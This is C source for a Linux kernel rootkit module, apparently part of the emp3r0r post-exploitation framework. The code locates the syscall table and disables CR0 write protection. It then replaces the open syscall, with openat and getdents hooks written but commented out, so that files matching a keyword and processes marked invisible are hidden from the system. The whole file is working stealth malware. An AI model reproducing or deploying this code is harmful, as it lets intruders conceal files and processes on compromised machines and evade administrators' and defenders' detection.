#define _GNU_SOURCE

#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#else
#include <linux/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#include "emp3r0r.h"

struct task_struct*
find_task(pid_t pid)
{
    struct task_struct* p = current;
    for_each_process(p)
    {
        if (p->pid == pid)
            return p;
    }
    return NULL;
}

int is_invisible(pid_t pid)
{
    struct task_struct* task;
    if (!pid)
        return 0;
    task = find_task(pid);
    if (!task)
        return 0;
    if (task->flags & PF_INVISIBLE)
        return 1;
    return 0;
}

// hooked syscalls
asmlinkage long
hooked_open(const char __user* pathname, int flags, int mode)
{
    int err = 0;

    // cannot use user-mode pointer in kernel
    char* kpathname = NULL;
    int pathlen = strnlen_user(pathname, 256);
    kpathname = kzalloc(pathlen, GFP_KERNEL);
    if (kpathname == NULL)
        goto orig;

    err = copy_from_user(kpathname, pathname, pathlen);
    if (err) {
        printk("copy_from_user: %d", err);
        goto orig;
    }

    // check for keyword
    if (strstr(kpathname, HIDE_ME) != NULL) {
        printk("Got a hit\n");
        kfree(kpathname);
        return -ENOENT;
    }

    // execute original syscall
orig:
    kfree(kpathname);
    return orig_open(pathname, flags, mode);
}

asmlinkage long
hooked_openat(int dirfd, const char __user* pathname, int flags, int mode)
{
    int err = 0;

    // cannot use user-mode pointer in kernel
    char* kpathname = NULL;
    /* int pathlen = strnlen_user(pathname, 256); */
    kpathname = kzalloc(256, GFP_KERNEL);
    if (kpathname == NULL)
        goto orig;

    err = copy_from_user(kpathname, pathname, 256);
    if (err)
        goto orig;

    // check for keyword
    if (strstr(kpathname, HIDE_ME) != NULL) {
        printk("Got a hit\n");
        kfree(kpathname);
        return -ENOENT;
    }

orig:
    kfree(kpathname);
    // execute original syscall
    return orig_openat(dirfd, pathname, flags, mode);
}

asmlinkage long
hooked_getdents64(unsigned int fd, struct linux_dirent64 __user* dirent,
    unsigned int count)
{
    int ret = orig_getdents64(fd, dirent, count), err;
    unsigned short proc = 0;
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct inode* d_inode;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err)
        goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
        /*&& MINOR(d_inode->i_rdev) == 1*/)
        proc = 1;

    while (off < ret) {
        dir = (void*)kdirent + off;
        if ((!proc && (memcmp(HIDE_ME, dir->d_name, strlen(HIDE_ME)) == 0))
            || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void*)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else
            prev = dir;
        off += dir->d_reclen;
    }
    err = copy_to_user(dirent, kdirent, ret);
    if (err)
        goto out;
out:
    kfree(kdirent);
    return ret;
}

asmlinkage long
hooked_getdents(unsigned int fd, struct linux_dirent __user* dirent,
    unsigned int count)
{
    int ret = orig_getdents(fd, dirent, count), err;
    unsigned short proc = 0;
    unsigned long off = 0;
    struct linux_dirent *dir, *kdirent, *prev = NULL;
    struct inode* d_inode;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err)
        goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
        /*&& MINOR(d_inode->i_rdev) == 1*/)
        proc = 1;

    while (off < ret) {
        dir = (void*)kdirent + off;
        if ((!proc && (memcmp(HIDE_ME, dir->d_name, strlen(HIDE_ME)) == 0))
            || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void*)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else
            prev = dir;
        off += dir->d_reclen;
    }
    err = copy_to_user(dirent, kdirent, ret);
    if (err)
        goto out;
out:
    kfree(kdirent);
    return ret;
}

/* this is how we alter the syscall table */
unsigned long cr0;
static unsigned long* __sys_call_table;
unsigned long*
get_syscall_table_bf(void)
{
    unsigned long* syscall_table;
    unsigned long int i;
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 15, 0)

    for (i = (unsigned long)sys_close; i < ULONG_MAX;
         i += sizeof(void*)) {
        syscall_table = (unsigned long*)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
#else
    i = kallsyms_lookup_name("sys_call_table");
    if (i == 0) {
        return NULL;
    }
    syscall_table = (unsigned long*)i;
    return syscall_table;
#endif
}

/* needed for hooking */
static inline void
write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void
protect_memory(void)
{
    write_cr0_forced(cr0);
}

static inline void
unprotect_memory(void)
{
    write_cr0_forced(cr0 & ~0x00010000);
}

static int lkminit(void)
{
    cr0 = read_cr0();
    __sys_call_table = get_syscall_table_bf();
    if (!__sys_call_table)
        return -1;

    // original syscall open
    orig_open = (orig_open_t)__sys_call_table[__NR_open];
    orig_openat = (orig_openat_t)__sys_call_table[__NR_openat];

    // hook syscall open
    printk("before unprotect_memory: %lx\n", read_cr0());
    unprotect_memory();
    printk("after unprotect_memory: %lx\n", read_cr0());
    __sys_call_table[__NR_open] = (unsigned long)hooked_open;
    /* __sys_call_table[__NR_openat] = (unsigned long)hooked_openat; */
    /* __sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents; */
    /* __sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64; */
    protect_memory();
    printk("vigi14nt-tr4in has successfully hooked some syscalls\n");

    return 0;
}

static void lkmexit(void)
{
    unprotect_memory();
    __sys_call_table[__NR_open] = (unsigned long)orig_open;
    /* __sys_call_table[__NR_openat] = (unsigned long)orig_openat; */
    /* __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents; */
    /* __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64; */
    printk("before protect_memory: %lx\n", read_cr0());
    protect_memory();
    printk("after protect_memory: %lx\n", read_cr0());
    printk("Syscalls have been restored\n");
}

module_init(lkminit);
module_exit(lkmexit);
